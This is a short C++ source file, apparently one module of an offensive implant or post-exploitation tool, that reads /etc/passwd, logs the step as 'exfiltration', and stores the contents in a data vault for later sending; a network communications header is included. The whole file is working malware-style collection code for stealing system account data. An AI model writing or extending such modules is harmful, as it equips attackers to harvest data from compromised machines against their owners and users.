#include "modules/gathering/EtcPasswd.hpp"
#include "utils/FileUtils.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Logger.hpp"
#include "utils/DataVault.hpp"
#include "network/Comms.hpp"

bool EtcPasswdMethod::trigger() {
    std::string data;

    LOG_INFO("Attempting /etc/passwd exfiltration")
    data += FileUtils::ReadFile("/etc/passwd");

    if (data.empty()) return false;

    LOG_INFO("Adding /etc/passwd to vault")
    DataVault::Append("etc_passwd", data);

    return true;
}
